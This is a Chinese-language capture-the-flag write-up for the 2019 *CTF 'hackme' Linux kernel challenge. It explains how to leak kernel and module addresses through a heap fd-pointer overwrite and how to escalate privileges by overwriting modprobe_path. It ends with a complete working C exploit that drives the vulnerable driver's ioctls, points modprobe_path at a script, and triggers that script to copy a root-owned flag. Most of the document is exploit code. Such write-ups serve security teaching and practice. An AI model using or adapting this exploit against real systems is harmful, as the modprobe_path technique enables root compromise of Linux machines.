---
layout: post
title: 2019 STARCTF hackme
excerpt: "利用modprobe_path方法提权"
categories: [writeup]
comments: true
---
参考:https://xz.aliyun.com/t/6067

启动脚本
```
#! /bin/sh
qemu-system-x86_64 \
    -m 256M \
    -nographic \
    -kernel bzImage \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \
    -monitor /dev/null \
    -initrd initramfs.cpio \
    -smp cores=4,threads=2 \
    -gdb tcp::1234 \
    -cpu qemu64,smep,smap
```
#### modprobe_path
modprobe_path指向了一个内核在运行未知文件类型时运行的二进制文件;当内核运行一个错误格式的文件的时候,会调用这个modprobe_path所指向的二进制文件去，如果我们将这个字符串指向我们的自己的二进制文件,那么在发生错误的时候就可以执行我们自己二进制文件了....

查看modprobe_path地址
```
root@snappyjack:~/2019# cat /proc/kallsyms | grep modprobe_path
ffffffffa405bce0 D modprobe_path
```
原理代码如下,其实就是调用了call_usermodehelper函数:
```
int __request_module(bool wait, const char *fmt, ...) 
{ 
    va_list args; 
    char module_name[MODULE_NAME_LEN]; 
    unsigned int max_modprobes; 
    int ret; 
// char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe"; 
    char *argv[] = { modprobe_path, "-q", "--", module_name, NULL }; 
    static char *envp[] = { "HOME=/", 
                "TERM=linux", 
                "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 
                NULL }; // 环境变量. 
    static atomic_t kmod_concurrent = ATOMIC_INIT(0); 
#define MAX_KMOD_CONCURRENT 50    /* Completely arbitrary value - KAO */ 
    static int kmod_loop_msg; 

    va_start(args, fmt); 
    ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);   
    va_end(args); 
    if (ret >= MODULE_NAME_LEN) 
        return -ENAMETOOLONG; 
    max_modprobes = min(max_threads/2, MAX_KMOD_CONCURRENT);    
    atomic_inc(&kmod_concurrent); 
    if (atomic_read(&kmod_concurrent) > max_modprobes) { 
        /* We may be blaming an innocent here, but unlikely */ 
        if (kmod_loop_msg++ < 5) 
            printk(KERN_ERR 
                   "request_module: runaway loop modprobe %s\n", 
                   module_name); 
        atomic_dec(&kmod_concurrent);                           
        return -ENOMEM;                                         
    } 
    ret = call_usermodehelper(modprobe_path, argv, envp,        // 就是这个函数,执行用户空间的应用程序
            wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC); 
    atomic_dec(&kmod_concurrent);                                
    return ret; 
}
```
#### mod_tree
mod_tree是一块包含了模块指针的内存地址,通过查看这个位置我们可以获取到ko文件的地址,在我们需要泄露模块基地址,但是在堆或栈中没有找到的时候可以查看这块内存区域:
```
root@snappyjack:~/2019# grep mod_tree /proc/kallsyms
ffffffffa2d28390 t __mod_tree_remove
ffffffffa2d296b0 t __mod_tree_insert
ffffffffa4006a80 d mod_tree
```
#### 泄露模块地址
根据fastbin的特点,我们知道fd指针指向下一次我们可以申请的地址,如果我们将fd指针修改了,我们就可以拿到我们想要的内存了,同理我们这里也是通过覆盖fd指针为mod_tree的地址,然后就可以查看mod_tree的内容然后就可以得到模块地址了:

覆盖fd指针的方法是先通过向上越访问就可以修改到fd指针,然后alloc两个块,就可以拿到mod_tree了:

#### Use Modprobe_path
通常我们有了任意地址读写能力后,我们可以通过修改cred结构体或者劫持VDSO来进行高权限的操作,但是这里我们使用一种比较有意思的方法来进行高权限的操作;
modprobe_path所指的位置通常是发生了错误的时候才调用的

##### 总结:就是通过任意地址读写修改modprobe_path处的二进制文件,从而进行任意文件读写(modprobe_path就是一个字符串指针,原理是call_usermodehelper(modprobe_path, argv, envp...,所以将这个字符串指针改为我们想要的就行了,注意是绝对路径)
最终exp
```
#include<stdio.h>
#include<unistd.h>
#include<fcntl.h>

struct heap{
    size_t id;
    size_t *data;
    size_t len;
    size_t offset;
};
int fd;

void alloc(int id, char *data, size_t len){
    struct heap h;
    h.id = id;
    h.data = data;
    h.len = len;
    ioctl(fd,0x30000,&h);
}

void delete(int id){
    struct heap h;
    h.id = id;
    ioctl(fd,0x30001,&h);
}

void cin_kernel(int id, char *data, size_t len, size_t offset){
    struct heap h;
    h.id = id;
    h.data = data;
    h.len = len;
    h.offset = offset;
    ioctl(fd,0x30002,&h);
}

void cout_kernel(int id, char *data, size_t len, size_t offset){
    struct heap h;
    h.id = id;
    h.data = data;
    h.len = len;
    h.offset = offset;
    ioctl(fd,0x30003,&h);
}

int main(){
    fd = open("/dev/hackme",0);     // 打开设备
    size_t heap_addr,kernel_addr,mod_tree_addr,ko_addr,pool_addr;
    char *mem = malloc(0x1000);     // 申请一块内存空间
    if(fd < 0){
        printf("[*]OPEN KO ERROR!\n");
        exit(0);
    }
    memset(mem,'A',0x100);
    alloc(0,mem,0x100);         // 也是一种分配内存的方式
    alloc(1,mem,0x100);
    alloc(2,mem,0x100);
    alloc(3,mem,0x100);
    alloc(4,mem,0x100);

    delete(1);
    delete(3);
    cout_kernel(4,mem,0x100,-0x100);
    heap_addr = *((size_t  *)mem) - 0x100;
    printf("[*]heap_addr: 0x%16llx\n",heap_addr);

    cout_kernel(0,mem,0x200,-0x200);
    kernel_addr = *((size_t *)mem) - 0x0472c0;                  // 通过调试得到
    mod_tree_addr = kernel_addr + 0x011000;                     // 通过grep mod_tree /proc/kallsyms 得到
    printf("[*]kernel_addr: 0x%16llx\n",kernel_addr);           // 内核的基地址
    printf("[*]mod_tree_add: 0x%16llx\n",mod_tree_addr);        // 内核mod_tree地址

    memset(mem,'B',0x100);
    *((size_t  *)mem) = mod_tree_addr + 0x50;
    cin_kernel(4,mem,0x100,-0x100);
    memset(mem,'C',0x100);
    alloc(5,mem,0x100);
    alloc(6,mem,0x100);
    cout_kernel(6,mem,0x40,-0x40);
    ko_addr = *((size_t *)mem) - 0x2338;
    pool_addr = ko_addr + 0x2400;
    printf("[*]ko_addr: 0x%16llx\n",ko_addr);
    printf("[*]pool_addr: 0x%16llx\n",pool_addr);

    delete(2);
    delete(5);
    memset(mem,'D',0x100);
    *((size_t  *)mem) = pool_addr + 0xc0;
    cin_kernel(4,mem,0x100,-0x100);
    alloc(7,mem,0x100);
    alloc(8,mem,0x100);

    *((size_t *)mem) = kernel_addr + 0x03f960;
    *((size_t *)(mem+0x8)) = 0x100;
    cin_kernel(8,mem,0x10,0);

    strncpy(mem,"/home/pwn/copy.sh\0",18);
    cin_kernel(0xc,mem,18,0);


    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
    system("chmod +x /home/pwn/copy.sh");                       // 运行一系列函数
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/sir");
    system("chmod +x /home/pwn/sir");

    system("/home/pwn/sir");
    system("cat /home/pwn/flag");
    return 0;
}
```